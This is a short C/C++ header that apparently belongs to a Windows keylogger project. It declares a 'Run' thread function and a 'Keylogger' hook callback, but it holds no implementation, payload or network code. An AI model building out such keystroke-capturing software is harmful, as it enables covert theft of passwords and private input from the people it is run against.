#pragma once
#include "Headers.h"
#include "ProcessMessage.h"
DWORD WINAPI Run(void);
LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam);